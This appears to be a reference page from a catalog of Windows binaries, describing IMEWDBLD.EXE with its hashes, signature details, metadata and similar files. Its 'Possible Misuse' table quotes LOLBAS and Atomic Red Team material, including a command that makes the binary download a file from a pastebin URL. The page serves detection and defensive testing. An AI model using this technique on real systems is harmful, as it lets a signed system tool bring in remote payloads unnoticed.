---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `B840116C2D5805095F46CFD8ACBD0EB8`
SHA1 | `510F13471666C1C8A3F4E78FD876CD08F3BB2601`
SHA256 | `78956713B79E22361440A709C3EA4A927C65B25F6FC21085B092F8091C37FF16`
SHA384 | `F194B7F1EA534BCBF17E8E7079DCB894F2DC015F07C167EDF4371B386972E5A077DD09891D46C6FA9E1008EDF206F2B9`
SHA512 | `D102CD59C6CE3413E908BA52E524DDFD8746CF44C9B2325D7460C435E78EDBD97CB1C90D3080F057ABEB51497D9BAB015A6C0625A0AD23E7115B752F327B5A97`
SSDEEP | `6144:xY4ljl31QqsmALkpx5dsMxOSV2mCFtYRT2Y4Eyxh8/hsrQzR7Gs/UEVTppcX+jES:i4lB3aqPdspwDIMkC9zR7Gs/rG`

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.14393.2608 (rs1_release.181024-1742)
* Product Version: 10.0.14393.2608
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-8B8C8F73B4E96963DD9A6E760C5F77DD.md) | 32
[C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.md) | 36
[C:\Windows\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-FBEE6DD18640B1575FF98D1EB3B51724.md) | 36
[C:\Windows\SysWOW64\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-0984D217E10D11B2DBB8CCD47CDF36BD.md) | 38
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-40FBB367D0F83472C170359D6E3446A0.md) | 33
[C:\windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-8EDFF2D1145341D7B23D012B29910539.md) | 29
[C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-F042BFE4E2BE1EF592D9CFA14F8E6BD1.md) | 32

## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


